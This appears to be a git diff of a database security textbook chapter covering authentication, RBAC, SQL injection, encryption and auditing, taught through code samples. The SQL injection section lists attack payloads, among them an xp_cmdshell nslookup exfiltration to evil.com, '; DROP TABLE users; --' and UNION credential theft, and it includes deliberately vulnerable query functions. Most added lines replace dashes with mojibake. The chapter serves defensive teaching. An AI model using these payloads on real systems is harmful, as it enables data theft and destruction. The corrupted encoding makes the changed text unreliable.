@@ -1,6 +1,6 @@
-# Chapter 18: Database Security
+﻿# Chapter 18: Database Security
 
-> **Prev:** [Chapter 17 â€” Distributed DB](17-distributed-db.md) | **Next:** [Chapter 19 â€” Performance Tuning](19-performance-tuning.md)
+> **Prev:** [Chapter 17 Ã¢â‚¬â€ Distributed DB](17-distributed-db.md) | **Next:** [Chapter 19 Ã¢â‚¬â€ Performance Tuning](19-performance-tuning.md)
 
 ## Learning Objectives
 
@@ -17,16 +17,16 @@
 <!-- Image Gallery -->
 <section class="lesson-visuals" aria-label="Visual learning resources">
   <header><span>VISUAL LEARNING</span><h2>See it. Review it. Remember it.</h2></header>
-  <a class="lesson-visual-card" href="../../../assets/images/lessons/database-management-systems/18-security/.png" target="_blank" rel="noopener">
-    <img src="../../../assets/images/lessons/database-management-systems/18-security/.png" alt="Handwritten notes" loading="lazy">
+  <a class="lesson-visual-card" href="../../assets/images/lessons/database-management-systems/18-security/handwritten-notes.png" target="_blank" rel="noopener">
+    <img src="../../assets/images/lessons/database-management-systems/18-security/handwritten-notes.png" alt="Handwritten notes" loading="lazy">
     <span><strong>Handwritten notes</strong>Condensed notes for deliberate review.</span>
   </a>
-  <a class="lesson-visual-card" href="../../../assets/images/lessons/database-management-systems/18-security/.png" target="_blank" rel="noopener">
-    <img src="../../../assets/images/lessons/database-management-systems/18-security/.png" alt="Sticky-note revision" loading="lazy">
+  <a class="lesson-visual-card" href="../../assets/images/lessons/database-management-systems/18-security/sticky-notes.png" target="_blank" rel="noopener">
+    <img src="../../assets/images/lessons/database-management-systems/18-security/sticky-notes.png" alt="Sticky-note revision" loading="lazy">
     <span><strong>Sticky-note revision</strong>Fast recall prompts for revision.</span>
   </a>
-  <a class="lesson-visual-card" href="../../../assets/images/lessons/database-management-systems/18-security/.png" target="_blank" rel="noopener">
-    <img src="../../../assets/images/lessons/database-management-systems/18-security/.png" alt="Visual concept guide" loading="lazy">
+  <a class="lesson-visual-card" href="../../assets/images/lessons/database-management-systems/18-security/visual-explanation.png" target="_blank" rel="noopener">
+    <img src="../../assets/images/lessons/database-management-systems/18-security/visual-explanation.png" alt="Visual concept guide" loading="lazy">
     <span><strong>Visual concept guide</strong>A connected explanation of the key ideas.</span>
   </a>
 </section>
@@ -39,7 +39,7 @@
 |-------|-------------|-------------------|
 | **Authentication** | Username/password, Kerberos, certificates, LDAP, MFA | Use multi-factor authentication for all database access |
 | **Authorization** | GRANT/REVOKE with role-based access control | Follow the principle of least privilege; never use superuser for apps |
-| **Encryption** | Transparent Data Encryption (TDE) + TLS | Encrypt at rest AND in transit â€” never one without the other |
+| **Encryption** | Transparent Data Encryption (TDE) + TLS | Encrypt at rest AND in transit Ã¢â‚¬â€ never one without the other |
 | **SQL Injection** | Malicious input alters query structure | Always use parameterized queries (prepared statements) |
 | **Auditing** | Log all DDL, DML, and login attempts | Enable audit logging with centralized SIEM integration |
 | **Backup Security** | Encrypted backups with restricted access | Test restore from encrypted backups regularly |
@@ -74,25 +74,25 @@ flowchart LR
 ### 18.1 The Database Security Landscape
 
 
-**Real-World Analogy â€” The Bank Vault:**
+**Real-World Analogy Ã¢â‚¬â€ The Bank Vault:**
 
-A database is like a bank vault. The vault itself is steel and concrete (encryption at rest). The courier trucks use armored transport (encryption in transit). Only cleared personnel enter the vault room (authentication). Even inside, tellers can only access cash drawers, not safety deposit boxes (authorization â€” least privilege). Security cameras record everyone (auditing). A janitor who finds keys on a desk is the insider threat. A robber who tricks a teller into opening the vault commits social engineering. A database breach is the digital equivalent of a bank heist â€” except attackers can copy data silently without ever being inside the building.
+A database is like a bank vault. The vault itself is steel and concrete (encryption at rest). The courier trucks use armored transport (encryption in transit). Only cleared personnel enter the vault room (authentication). Even inside, tellers can only access cash drawers, not safety deposit boxes (authorization Ã¢â‚¬â€ least privilege). Security cameras record everyone (auditing). A janitor who finds keys on a desk is the insider threat. A robber who tricks a teller into opening the vault commits social engineering. A database breach is the digital equivalent of a bank heist Ã¢â‚¬â€ except attackers can copy data silently without ever being inside the building.
 
 **Threat Categories:**
 
 | Threat | Example | Impact | Real-World Incident |
 |--------|---------|--------|-------------------|
-| SQL Injection | `' OR 1=1 --` | Data exfiltration | 2009 Heartland Payment Systems â€” 130M cards stolen via SQLi |
-| Credential Theft | Stolen DB passwords | Full database access | 2013 Yahoo â€” all 3B accounts exposed via stolen creds |
-| Privilege Escalation | User gets admin rights | Unauthorized data access | 2015 OPM breach â€” 22M records via elevated privileges |
-| Insider Threat | Employee exports customer data | Data leak | 2019 Capital One â€” 100M records exfiltrated by insider |
+| SQL Injection | `' OR 1=1 --` | Data exfiltration | 2009 Heartland Payment Systems Ã¢â‚¬â€ 130M cards stolen via SQLi |
+| Credential Theft | Stolen DB passwords | Full database access | 2013 Yahoo Ã¢â‚¬â€ all 3B accounts exposed via stolen creds |
+| Privilege Escalation | User gets admin rights | Unauthorized data access | 2015 OPM breach Ã¢â‚¬â€ 22M records via elevated privileges |
+| Insider Threat | Employee exports customer data | Data leak | 2019 Capital One Ã¢â‚¬â€ 100M records exfiltrated by insider |
 | Network Eavesdropping | Unencrypted connection | Credential/data theft | Packet sniffing on public Wi-Fi |
-| Backup Compromise | Stolen backup tapes | Offline data access | 2008 Hannaford â€” 4.2M cards from unencrypted backups |
-| Social Engineering | DBA tricked into revealing password | Credential compromise | 2020 Twitter â€” 130 accounts via phone-based social engineering |
-| Ransomware | Encrypt database files | Data unavailability | 2021 Colonial Pipeline â€” $4.4M paid, pipeline shut |
+| Backup Compromise | Stolen backup tapes | Offline data access | 2008 Hannaford Ã¢â‚¬â€ 4.2M cards from unencrypted backups |
+| Social Engineering | DBA tricked into revealing password | Credential compromise | 2020 Twitter Ã¢â‚¬â€ 130 accounts via phone-based social engineering |
+| Ransomware | Encrypt database files | Data unavailability | 2021 Colonial Pipeline Ã¢â‚¬â€ $4.4M paid, pipeline shut |
 
 
-**Numbered Steps â€” Database Security Risk Assessment:**
+**Numbered Steps Ã¢â‚¬â€ Database Security Risk Assessment:**
 
 1. **Identify assets:** Catalog all databases, their schemas, and sensitivity levels
 2. **Classify data:** Label columns as public, internal, confidential, or restricted
@@ -105,7 +105,7 @@ A database is like a bank vault. The vault itself is steel and concrete (encrypt
 9. **Monitor continuously:** Audit logs, alerting, periodic reassessment
 10. **Review quarterly:** Repeat steps 3-9 every quarter
 
-**Pseudocode â€” Security Risk Scoring:**
+**Pseudocode Ã¢â‚¬â€ Security Risk Scoring:**
 
 ```
 FUNCTION calculateRisk(threat, asset)
@@ -113,19 +113,19 @@ FUNCTION calculateRisk(threat, asset)
     impact = asset.sensitivity * asset.exposure   // 1-5 scale
     riskScore = likelihood * impact
     IF riskScore >= 20 THEN
-        label = "CRITICAL â€” immediate action required"
+        label = "CRITICAL Ã¢â‚¬â€ immediate action required"
     ELSE IF riskScore >= 12 THEN
-        label = "HIGH â€” remediate within 30 days"
+        label = "HIGH Ã¢â‚¬â€ remediate within 30 days"
     ELSE IF riskScore >= 6 THEN
-        label = "MEDIUM â€” remediate within 90 days"
+        label = "MEDIUM Ã¢â‚¬â€ remediate within 90 days"
     ELSE
-        label = "LOW â€” monitor"
+        label = "LOW Ã¢â‚¬â€ monitor"
     END IF
     RETURN { riskScore, label }
 END FUNCTION
 ```
 
-**C++ Implementation â€” Basic Threat Classifier:**
+**C++ Implementation Ã¢â‚¬â€ Basic Threat Classifier:**
 
 ```cpp
 #include <iostream>
@@ -170,7 +170,7 @@ int main() {
 }
 ```
 
-**Python Implementation â€” Security Auditor:**
+**Python Implementation Ã¢â‚¬â€ Security Auditor:**
 
 ```python
 from dataclasses import dataclass
@@ -246,11 +246,11 @@ if __name__ == "__main__":
 
 Authentication verifies the identity of a user or application connecting to the database.
 
-**Real-World Analogy â€” Airport Security Check:**
+**Real-World Analogy Ã¢â‚¬â€ Airport Security Check:**
 
 Authentication is like showing your passport at airport security. The passport proves who you claim to be (password is your ID card). A visa adds another verification layer (MFA is the extra stamp). A diplomatic passport gets different clearance (certificate auth). The retinal scanner at the VIP lounge is biometric auth. All of these answer one question: "Who are you?"
 
-**Numbered Steps â€” Database Authentication Flow:**
+**Numbered Steps Ã¢â‚¬â€ Database Authentication Flow:**
 
 1. Client opens TCP connection to database port (e.g., 5432 for PostgreSQL)
 2. Server sends a random challenge (nonce) to client
@@ -262,7 +262,7 @@ Authentication is like showing your passport at airport security. The passport p
 8. On failure after max_attempts, server delays or locks account
 9. All attempts logged to audit trail
 
-**Pseudocode â€” Authentication Module:**
+**Pseudocode Ã¢â‚¬â€ Authentication Module:**
 
 ```
 FUNCTION authenticate(username, password, connection)
@@ -337,7 +337,7 @@ CREATE USER 'external_user' IDENTIFIED WITH auth_ldap_simple
 - Combine DB password with client certificate, TOTP, or SSH key
 - Increasingly common in regulated environments (HIPAA, PCI-DSS)
 
-**Python Implementation â€” Authentication Handler:**
+**Python Implementation Ã¢â‚¬â€ Authentication Handler:**
 
 ```python
 import hashlib, os, time, hmac
@@ -421,7 +421,7 @@ if __name__ == "__main__":
     print("\n".join(auth.get_audit_log()))
 ```
 
-**C++ Implementation â€” Password Verification:**
+**C++ Implementation Ã¢â‚¬â€ Password Verification:**
 
 ```cpp
 #include <iostream>
@@ -454,7 +454,7 @@ std::string sha256(const std::string& input) {
 }
 #else
 std::string sha256(const std::string& input) {
-    // placeholder â€” use OpenSSL on Linux
+    // placeholder Ã¢â‚¬â€ use OpenSSL on Linux
     return input;
 }
 #endif
@@ -529,12 +529,12 @@ int main() {
 }
 ```
 
-**Dry Run Trace Table â€” Authentication Attempt:**
+**Dry Run Trace Table Ã¢â‚¬â€ Authentication Attempt:**
 
 | Step | Component | Action | Input | Output | State Change |
 |------|-----------|--------|-------|--------|-------------|
-| 1 | Client | TCP connect | user=alice | SYN â†’ 5432 | Connection pending |
-| 2 | Server | Send nonce | random=0xA3F2 | â† challenge | Session init |
+| 1 | Client | TCP connect | user=alice | SYN Ã¢â€ â€™ 5432 | Connection pending |
+| 2 | Server | Send nonce | random=0xA3F2 | Ã¢â€ Â challenge | Session init |
 | 3 | Client | Hash password | "secret123" + nonce | hash=0x7B4E | Compute phase |
 | 4 | Server | Compare hashes | stored_hash vs received | match=true | Auth verified |
 | 5 | Server | Check MFA | mfa_enabled=false | skip | MFA bypassed |
@@ -582,13 +582,13 @@ int main() {
 ### 18.3 Authorization and Access Control
 
 
-Authorization determines what an authenticated user is permitted to do â€” which tables, columns, rows, and operations they can access.
+Authorization determines what an authenticated user is permitted to do Ã¢â‚¬â€ which tables, columns, rows, and operations they can access.
 
-**Real-World Analogy â€” Library Card Levels:**
+**Real-World Analogy Ã¢â‚¬â€ Library Card Levels:**
 
 A library has different access tiers. A basic card lets you borrow books (SELECT). A research card grants access to the reference section (SELECT on restricted tables). A librarian badge lets you add new books (INSERT/UPDATE). The head librarian can hire/fire staff (DDL/DCL). A special government clearance might let you see classified archives (row-level security). These tiers precisely mirror database roles and privileges.
 
-**Numbered Steps â€” Granting and Revoking Privileges:**
+**Numbered Steps Ã¢â‚¬â€ Granting and Revoking Privileges:**
 
 1. **Create roles:** Define functional roles (read_only, read_write, admin)
 2. **Grant privileges to roles:** Attach table/column/operation permissions
@@ -603,10 +603,10 @@ A library has different access tiers. A basic card lets you borrow books (SELECT
 
 | Model | Granularity | Administration | Scalability | Flexibility | Use Case |
 |-------|-------------|---------------|-------------|-------------|----------|
-| **DAC** (Discretionary) | Object owner controls access | Per-object basis | Low â€” every object managed separately | High â€” owner decides | File systems; small teams |
-| **MAC** (Mandatory) | System-wide labels (TS/SCI) | Central authority only | Medium â€” label-based | Low â€” rigid hierarchy | Military; classified data |
-| **RBAC** (Role-Based) | Roles with bundled privileges | Role management | High â€” roles scale | Medium â€” role explosion possible | Enterprise; most DBMS |
-| **ABAC** (Attribute-Based) | User/Resource/Environment attributes | Policy engine | Very High â€” policy-driven | Very High â€” dynamic | Cloud; zero-trust architectures |
+| **DAC** (Discretionary) | Object owner controls access | Per-object basis | Low Ã¢â‚¬â€ every object managed separately | High Ã¢â‚¬â€ owner decides | File systems; small teams |
+| **MAC** (Mandatory) | System-wide labels (TS/SCI) | Central authority only | Medium Ã¢â‚¬â€ label-based | Low Ã¢â‚¬â€ rigid hierarchy | Military; classified data |
+| **RBAC** (Role-Based) | Roles with bundled privileges | Role management | High Ã¢â‚¬â€ roles scale | Medium Ã¢â‚¬â€ role explosion possible | Enterprise; most DBMS |
+| **ABAC** (Attribute-Based) | User/Resource/Environment attributes | Policy engine | Very High Ã¢â‚¬â€ policy-driven | Very High Ã¢â‚¬â€ dynamic | Cloud; zero-trust architectures |
 
 **SQL-Based RBAC Implementation:**
 
@@ -636,7 +636,7 @@ GRANT SELECT ON company.* TO 'analyst'@'%';
 REVOKE SELECT (ssn), SELECT (salary) ON company.employees FROM 'analyst'@'%';
 ```
 
-**Pseudocode â€” RBAC Authorization Checker:**
+**Pseudocode Ã¢â‚¬â€ RBAC Authorization Checker:**
 
 ```
 FUNCTION authorize(user, operation, target_object, target_row_data)
@@ -683,13 +683,13 @@ FUNCTION authorize(user, operation, target_object, target_row_data)
         END IF
     END FOR
 
-    // Step 6: Default deny â€” no matching permission found
+    // Step 6: Default deny Ã¢â‚¬â€ no matching permission found
     log("DENIED_DEFAULT", user, target_object, operation)
     RETURN False
 END FUNCTION
 ```
 
-**Python Implementation â€” RBAC Manager:**
+**Python Implementation Ã¢â‚¬â€ RBAC Manager:**
 
 ```python
 from dataclasses import dataclass, field
@@ -789,7 +789,7 @@ if __name__ == "__main__":
     rbac.print_audit()
 ```
 
-**C++ Implementation â€” RBAC Checker:**
+**C++ Implementation Ã¢â‚¬â€ RBAC Checker:**
 
 ```cpp
 #include <iostream>
@@ -862,7 +862,7 @@ int main() {
 }
 ```
 
-**Dry Run Trace Table â€” Privilege Escalation Attempt:**
+**Dry Run Trace Table Ã¢â‚¬â€ Privilege Escalation Attempt:**
 
 | Step | User | SQL Statement | Permission Check | Result | Explanation |
 |------|------|--------------|-----------------|--------|-------------|
@@ -895,16 +895,16 @@ int main() {
 | Row-level bypass | User can query rows they shouldn't via self-join trick | RLS + column permissions together; test with SET ROLE |
 
 
-> **One-Sentence Takeaway:** SQL injection exploits unsanitized user input â€” parameterized queries are the definitive defense.
+> **One-Sentence Takeaway:** SQL injection exploits unsanitized user input Ã¢â‚¬â€ parameterized queries are the definitive defense.
 
 ### 18.4 SQL Injection
 
 
 SQL injection is the most critical database security vulnerability. It occurs when user input is directly concatenated into SQL queries, allowing attackers to alter the query structure.
 
-**Real-World Analogy â€” The Wall Safe with a Backdoor:**
+**Real-World Analogy Ã¢â‚¬â€ The Wall Safe with a Backdoor:**
 
-Imagine a wall safe. When you enter the correct combination, the door opens (normal query). Now imagine the safe has a hidden backdoor: entering "ANY 4 DIGITS + press lever" also opens it. An attacker discovers this and can now open any safe. SQL injection is that backdoor. A WAF (Web Application Firewall) is like adding a guard who watches for suspicious combination attempts â€” helpful, but the real fix is removing the backdoor entirely (parameterized queries).
+Imagine a wall safe. When you enter the correct combination, the door opens (normal query). Now imagine the safe has a hidden backdoor: entering "ANY 4 DIGITS + press lever" also opens it. An attacker discovers this and can now open any safe. SQL injection is that backdoor. A WAF (Web Application Firewall) is like adding a guard who watches for suspicious combination attempts Ã¢â‚¬â€ helpful, but the real fix is removing the backdoor entirely (parameterized queries).
 
 **SQL Injection Types Comparison:**
 
@@ -915,10 +915,10 @@ Imagine a wall safe. When you enter the correct combination, the door opens (nor
 | **Blind (Boolean)** | Ask true/false questions via conditional responses | Medium | Medium (data extraction) | Page content changes | `' OR (SELECT COUNT(*) FROM users) > 0 --` |
 | **Blind (Time-Based)** | Use SLEEP/WAITFOR to infer true/false via response timing | Medium-High | Medium (slow extraction) | Response delay | `' OR IF((SELECT COUNT(*) FROM users)>0, WAITFOR(5), 0) --` |
 | **Out-of-Band** | Exfiltrate data via DNS/HTTP requests to attacker server | High | Very High (silent exfil) | Network monitoring | `'; EXEC xp_cmdshell('nslookup ' + data + '.evil.com') --` |
-| **Second-Order** | Malicious input stored then executed in a different context | Medium-High | High (delayed attack) | Hard â€” no immediate effect | Register with payload as username; triggers later in admin panel |
+| **Second-Order** | Malicious input stored then executed in a different context | Medium-High | High (delayed attack) | Hard Ã¢â‚¬â€ no immediate effect | Register with payload as username; triggers later in admin panel |
 | **Stacked Queries** | Execute multiple statements via semicolon | High | Very High (DML/DDL) | Depends on DBMS support | `'; DROP TABLE users; --` |
 
-**SQL: Vulnerable vs Safe â€” Full Demonstration:**
+**SQL: Vulnerable vs Safe Ã¢â‚¬â€ Full Demonstration:**
 
 ```sql
 -- Vulnerable table
@@ -936,7 +936,7 @@ CREATE TABLE users (
 -- Attack 1: SQLi Bypass
 -- Input: ' OR '1'='1
 -- Query becomes: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
--- Returns ALL users â€” authentication bypassed!
+-- Returns ALL users Ã¢â‚¬â€ authentication bypassed!
 
 -- Attack 2: UNION data theft
 -- Input: ' UNION SELECT id,username,credit_card,NULL FROM users --
@@ -962,7 +962,7 @@ END;
 $$ LANGUAGE plpgsql SECURITY DEFINER;
 ```
 
-**Python â€” SQL Injection Prevention:**
+**Python Ã¢â‚¬â€ SQL Injection Prevention:**
 
 ```python
 import sqlite3
@@ -1019,7 +1019,7 @@ class SafeDatabase:
         )
         return cur.fetchall()
 
-    # VULNERABLE (for demonstration only â€” never use this)
+    # VULNERABLE (for demonstration only Ã¢â‚¬â€ never use this)
     def get_user_vulnerable(self, username: str) -> list:
         query = f"SELECT * FROM users WHERE username = '{username}'"
         cur = self.conn.execute(query)
@@ -1049,7 +1049,7 @@ if __name__ == "__main__":
     print(db.detect_injection_attempt("alice"))
 ```
 
-**C++ â€” SQL Injection Prevention with Parameterized Queries (SQLite):**
+**C++ Ã¢â‚¬â€ SQL Injection Prevention with Parameterized Queries (SQLite):**
 
 ```cpp
 #include <iostream>
@@ -1086,7 +1086,7 @@ public:
         return results;
     }
 
-    // VULNERABLE â€” string concatenation (never use)
+    // VULNERABLE Ã¢â‚¬â€ string concatenation (never use)
     std::vector<std::string> getUserVulnerable(const std::string& username) {
         sqlite3_stmt* stmt;
         std::string sql = "SELECT * FROM users WHERE username = '" + username + "'";
@@ -1107,7 +1107,7 @@ int main() {
 }
 ```
 
-**Dry Run Trace Table â€” SQL Injection Exploit Walkthrough:**
+**Dry Run Trace Table Ã¢â‚¬â€ SQL Injection Exploit Walkthrough:**
 
 | Step | User Input | SQL Query (After Interpolation) | DB Response | Attacker Action |
 |------|-----------|---------------------------------|-------------|-----------------|
@@ -1119,7 +1119,7 @@ int main() {
 | 6 | `' OR (SELECT 1 FROM pg_sleep(5)) IS NOT NULL --` | ... with pg_sleep(5) | 5-second delay | Blind time-based detection |
 | 7 | `' UNION SELECT null,table_name,null,null FROM information_schema.tables WHERE table_schema='public' --` | ... UNION ... | Returns table list | Schema enumeration |
 
-**Python â€” Blind SQL Injection Detector (Simulation):**
+**Python Ã¢â‚¬â€ Blind SQL Injection Detector (Simulation):**
 
 ```python
 import re, time
@@ -1137,10 +1137,10 @@ def simulate_blind_sqli(username: str) -> tuple[str, float]:
         return "VULNERABLE: Time-based injection detected", time.time() - start
 
     if "' OR '" in username or "1=1" in username:
-        return "VULNERABLE: Boolean-based injection â€” returns all rows", time.time() - start
+        return "VULNERABLE: Boolean-based injection Ã¢â‚¬â€ returns all rows", time.time() - start
 
     if " UNION SELECT " in username.upper():
-        return "VULNERABLE: UNION-based injection â€” data exfiltrated", time.time() - start
+        return "VULNERABLE: UNION-based injection Ã¢â‚¬â€ data exfiltrated", time.time() - start
 
     return "SAFE", time.time() - start
 
@@ -1173,7 +1173,7 @@ for attack in attacks:
 | Stored procedure injection | Dynamic SQL inside SP with concatenated params | Use EXECUTE USING (PostgreSQL) or sp_executesql (SQL Server) |
 | ORM injection | Hibernate/SQLAlchemy dynamic query | Use ORM's parameterized API; avoid native SQL with concatenation |
 | JSON/XML injection | JSON path expressions with user input | Parameterize JSON/XML queries; validate structure |
-| WAF bypass | Attacker crafts payload that evades rules | Don't rely on WAF alone â€” parameterized queries are primary defense |
+| WAF bypass | Attacker crafts payload that evades rules | Don't rely on WAF alone Ã¢â‚¬â€ parameterized queries are primary defense |
 
 **Advantages & Disadvantages:**
 
@@ -1182,7 +1182,7 @@ for attack in attacks:
 | Parameterized Queries | 100% effective; zero bypass | Cannot parameterize table/column names |
 | Stored Procedures | Encapsulated; consistent | Still vulnerable if dynamic SQL inside |
 | ORM Frameworks | Automatic parameterization | Complex queries may generate poor SQL |
-| Input Validation | Defense in depth | Block-based â€” may reject legitimate input |
+| Input Validation | Defense in depth | Block-based Ã¢â‚¬â€ may reject legitimate input |
 | WAF | Network-level protection | Can be bypassed; adds latency |
 
 
@@ -1191,11 +1191,11 @@ for attack in attacks:
 ### 18.5 Encryption
 
 
-**Real-World Analogy â€” The Locked Briefcase in a Vault:**
+**Real-World Analogy Ã¢â‚¬â€ The Locked Briefcase in a Vault:**
 
 Encryption at rest is like locking a sensitive document in a briefcase before storing it in a bank vault. Even if someone cracks the vault, they still need the briefcase key. Encryption in transit is like using a tamper-proof armored courier to transport the briefcase between locations. They serve different purposes but together create end-to-end protection.
 
-**Numbered Steps â€” Encryption at Rest with pgcrypto:**
+**Numbered Steps Ã¢â‚¬â€ Encryption at Rest with pgcrypto:**
 
 1. Install pgcrypto extension (`CREATE EXTENSION pgcrypto`)
 2. Generate or import encryption key (use key management service)
@@ -1213,7 +1213,7 @@ Encryption at rest is like locking a sensitive document in a briefcase before st
 | **At Rest: TDE** | Filesystem-level encryption, transparent to DB | 3-5% I/O overhead | Entire database or tablespace | Server certificate or wallet | Disk theft, backup protection |
 | **At Rest: Column-Level** | Application or pgcrypto per column | 10-30% per encrypted column | Specific columns only | Application-managed keys | SSN, credit card, PII |
 | **At Rest: Filesystem** (LUKS/ bitlocker) | Block-level encryption | 1-5% I/O overhead | Entire disk/filesystem | OS key management | Defense in depth |
-| **Application-Layer** | Encrypt before DB write, decrypt after read | 5-20% app overhead | Specific fields | App or client-side keys | Zero-trust â€” DB never sees plaintext |
+| **Application-Layer** | Encrypt before DB write, decrypt after read | 5-20% app overhead | Specific fields | App or client-side keys | Zero-trust Ã¢â‚¬â€ DB never sees plaintext |
 
 **SQL: TDE and Column-Level Encryption:**
 
@@ -1276,7 +1276,7 @@ require_secure_transport = ON
 psql "host=db.example.com port=5432 dbname=mydb sslmode=verify-full sslrootcert=root.crt"
 ```
 
-**Pseudocode â€” Column-Level Encryption/Decryption:**
+**Pseudocode Ã¢â‚¬â€ Column-Level Encryption/Decryption:**
 
 ```
 FUNCTION encrypt_column(plaintext, encryption_key)
@@ -1313,7 +1313,7 @@ FUNCTION decrypt_column(encrypted_data, encryption_key)
 END FUNCTION
 ```
 
-**Python â€” Column-Level Encryption Implementation:**
+**Python Ã¢â‚¬â€ Column-Level Encryption Implementation:**
 
 ```python
 import os
@@ -1384,7 +1384,7 @@ if __name__ == "__main__":
     print(f"Decrypted: {pt}")
 ```
 
-**C++ â€” AES Encryption Wrapper (using OpenSSL):**
+**C++ Ã¢â‚¬â€ AES Encryption Wrapper (using OpenSSL):**
 
 ```cpp
 #include <iostream>
@@ -1432,13 +1432,13 @@ int main() {
 }
 ```
 
-**Dry Run Trace Table â€” Encryption at Rest:**
+**Dry Run Trace Table Ã¢â‚¬â€ Encryption at Rest:**
 
 | Step | Component | Action | Input | Output | Notes |
 |------|-----------|--------|-------|--------|-------|
-| 1 | App | Generate data key | â€” | 32-byte random key | One per table/column |
+| 1 | App | Generate data key | Ã¢â‚¬â€ | 32-byte random key | One per table/column |
 | 2 | App | Encrypt data key with master key | data_key, master_key | 48-byte wrapped key | Envelope encryption |
-| 3 | App.encrypt() | Generate IV | â€” | 16-byte IV | Unique per encryption |
+| 3 | App.encrypt() | Generate IV | Ã¢â‚¬â€ | 16-byte IV | Unique per encryption |
 | 4 | App.encrypt() | AES-256-CBC encrypt | ssn="123-45-6789", key, iv | 32-byte ciphertext | (16 bytes padded) |
 | 5 | App | Store in DB | base64(iv + ciphertext) | `OWZhMj...` (44 chars) | Column value |
 | 6 | DB | TDE encrypts page | Database page | Encrypted page | Transparent layer |
@@ -1475,11 +1475,11 @@ int main() {
 
 Auditing records all security-relevant database activity for compliance, breach detection, and forensic reconstruction.
 
-**Real-World Analogy â€” Bank Security Cameras and Logs:**
+**Real-World Analogy Ã¢â‚¬â€ Bank Security Cameras and Logs:**
 
-Auditing is a bank's security camera system. Every entrance, every teller station, every vault access is recorded. If money goes missing, security reviews the footage (audit log). But cameras are useless if nobody watches them â€” similarly, audit logs are useless without automated alerting and regular review. A bank also keeps a sign-in sheet for the vault (DDL audit), teller transaction journal (DML audit), and visitor log (login audit).
+Auditing is a bank's security camera system. Every entrance, every teller station, every vault access is recorded. If money goes missing, security reviews the footage (audit log). But cameras are useless if nobody watches them Ã¢â‚¬â€ similarly, audit logs are useless without automated alerting and regular review. A bank also keeps a sign-in sheet for the vault (DDL audit), teller transaction journal (DML audit), and visitor log (login audit).
 
-**Numbered Steps â€” Database Audit Implementation:**
+**Numbered Steps Ã¢â‚¬â€ Database Audit Implementation:**
 
 1. **Define scope:** Identify sensitive tables (users, payments, PII data)
 2. **Configure logging:** Enable query logging, connection logging, error logging
@@ -1490,7 +1490,7 @@ Auditing is a bank's security camera system. Every entrance, every teller statio
 7. **Integrate with SIEM:** Ship logs to Splunk, ELK, or Sentinel
 8. **Create alerts:** Mass delete, after-hours access, privilege changes
 9. **Review regularly:** Security team audit log review (weekly for critical)
-10. **Test audit integrity:** Verify tamper-proof constraint â€” logs are append-only
+10. **Test audit integrity:** Verify tamper-proof constraint Ã¢â‚¬â€ logs are append-only
 
 **SQL: Audit Configuration:**
 
@@ -1536,7 +1536,7 @@ CREATE TABLE audit_log (
 REVOKE UPDATE, DELETE, TRUNCATE ON audit_log FROM PUBLIC;
 ```
 
-**Python â€” Audit Logger with SIEM Export:**
+**Python Ã¢â‚¬â€ Audit Logger with SIEM Export:**
 
 ```python
 import json, time, socket, threading
@@ -1603,7 +1603,7 @@ class AuditLogger:
                     try:
                         self._sock.sendto(batch.encode(), (self.siem_host, self.siem_port))
                     except Exception:
-                        pass  # SIEM unavailable â€” keep in local buffer
+                        pass  # SIEM unavailable Ã¢â‚¬â€ keep in local buffer
 
     def _get_ip(self) -> str:
         return "127.0.0.1"
@@ -1626,9 +1626,9 @@ if __name__ == "__main__":
 
 Row-level security (RLS) restricts which rows a user can access based on their identity or attributes, without modifying the query itself.
 
-**Real-World Analogy â€” The Office Building with Floor Badges:**
+**Real-World Analogy Ã¢â‚¬â€ The Office Building with Floor Badges:**
 
-In a secure office building, your badge determines which floors you can access. Alice in sales can only go to floors 1-3 (see her region's customers). Bob in HR can access floors 1-5 (see all employees but only HR data). The elevator (database) automatically restricts floor access based on the badge â€” Alice doesn't need to remember which floors she can access; the system enforces it. RLS is the badge system for database rows.
+In a secure office building, your badge determines which floors you can access. Alice in sales can only go to floors 1-3 (see her region's customers). Bob in HR can access floors 1-5 (see all employees but only HR data). The elevator (database) automatically restricts floor access based on the badge Ã¢â‚¬â€ Alice doesn't need to remember which floors she can access; the system enforces it. RLS is the badge system for database rows.
 
 **SQL: PostgreSQL RLS:**
 
@@ -1709,7 +1709,7 @@ REVOKE ALL ON employees FROM PUBLIC;
 GRANT SELECT ON employees_public TO PUBLIC;
 ```
 
-**Python â€” Data Masking Utility:**
+**Python Ã¢â‚¬â€ Data Masking Utility:**
 
 ```python
 import re
@@ -1836,24 +1836,24 @@ DELETE FROM raw_logs WHERE created_at < NOW() - INTERVAL '90 days';
 ### 18.11 Security Layers (Defense in Depth)
 
 
-**Real-World Analogy â€” Castle Defense:**
+**Real-World Analogy Ã¢â‚¬â€ Castle Defense:**
 
-A medieval castle doesn't rely on a single wall. It has a moat (network firewall), a drawbridge (TLS handshake), arrow slits (database authorization), guards (authentication), inner walls (RLS), and locked treasure chests (encryption). Breaking one layer doesn't grant access to the treasure. Database security follows the same principle â€” layered defense so no single vulnerability compromises the data.
+A medieval castle doesn't rely on a single wall. It has a moat (network firewall), a drawbridge (TLS handshake), arrow slits (database authorization), guards (authentication), inner walls (RLS), and locked treasure chests (encryption). Breaking one layer doesn't grant access to the treasure. Database security follows the same principle Ã¢â‚¬â€ layered defense so no single vulnerability compromises the data.
 
 **Security Layers Comparison:**
 
 | Layer | Protection | Example Technology | Bypass Risk | Performance Impact |
 |-------|-----------|-------------------|-------------|-------------------|
-| **Network** | Restrict IP/port access | Firewall, VPC, Security Groups | Medium â€” misconfigured rules | None on DB server |
-| **Transport** | Encrypt network traffic | TLS 1.3, mTLS | Low â€” unless cert validation is disabled | ~2-10% connection latency |
-| **Authentication** | Verify identity | Passwords, Kerberos, MFA, LDAP | Medium â€” weak passwords, phishing | ~1-50ms per connection |
-| **Authorization** | Control operations | GRANT/REVOKE, RBAC | Low â€” bypass requires privilege escalation | Minimal (cached lookups) |
-| **Row-Level Security** | Filter rows by context | RLS policies, security predicates | Low â€” policy enforced by query rewriter | ~5-15% for policy evaluation |
-| **Encryption at Rest** | Protect data files | TDE, pgcrypto, LUKS | Low â€” unless key is compromised | ~3-5% I/O overhead |
-| **Auditing** | Detect and record | pgaudit, triggers, SIEM | Low â€” append-only prevents tampering | ~5-20% write throughput |
-| **Application** | Validate input before DB | Parameterized queries, ORM | High â€” most common bypass point | None on DB server |
+| **Network** | Restrict IP/port access | Firewall, VPC, Security Groups | Medium Ã¢â‚¬â€ misconfigured rules | None on DB server |
+| **Transport** | Encrypt network traffic | TLS 1.3, mTLS | Low Ã¢â‚¬â€ unless cert validation is disabled | ~2-10% connection latency |
